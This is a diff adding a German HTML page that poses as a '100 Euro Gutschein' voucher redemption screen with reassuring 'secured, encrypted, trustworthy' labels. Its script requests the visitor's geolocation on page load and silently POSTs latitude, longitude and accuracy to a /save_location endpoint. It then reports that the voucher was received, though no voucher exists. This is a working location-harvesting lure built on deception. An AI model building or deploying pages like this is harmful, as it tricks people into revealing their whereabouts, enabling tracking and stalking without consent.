@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>100 Euro Gutschein</title>
+
+    <!-- Google Font -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1e293b, #0f172a);
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(12px);
+            padding: 40px;
+            border-radius: 16px;
+            width: 350px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+        }
+
+        .icon {
+            font-size: 50px;
+            margin-bottom: 15px;
+        }
+
+        h1 {
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 14px;
+            color: #cbd5e1;
+            margin-bottom: 25px;
+        }
+
+        .status {
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+
+        .loading {
+            background: #334155;
+        }
+
+        .success {
+            background: #16a34a;
+        }
+
+        .error {
+            background: #dc2626;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #94a3b8;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="icon">📍</div>
+    <h1>100 Euro Gutschein</h1>
+    <p>Ihr Gutschein wird sicher Gutgeschrieben </p>
+
+    <div id="status" class="status loading">
+        Wird gesendet...
+    </div>
+
+    <div class="footer">
+        Gesichert • Verschlüsselt • Vertrauenswürdig
+    </div>
+</div>
+
+<script>
+window.onload = function() {
+    const status = document.getElementById("status");
+
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+
+                fetch('/save_location', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy
+                    })
+                })
+                .then(() => {
+                    status.className = "status success";
+                    status.innerText = "✔ Gutschein erhalten übertragen";
+                })
+                .catch(() => {
+                    status.className = "status error";
+                    status.innerText = "✖ Fehler beim Senden";
+                });
+
+            },
+            (err) => {
+                status.className = "status error";
+                status.innerText = "✖ Fehler: " + err.message;
+            }
+        );
+    } else {
+        status.className = "status error";
+        status.innerText = "✖ Geolocation nicht unterstützt";
+    }
+};
+</script>
+
+</body>
+</html>
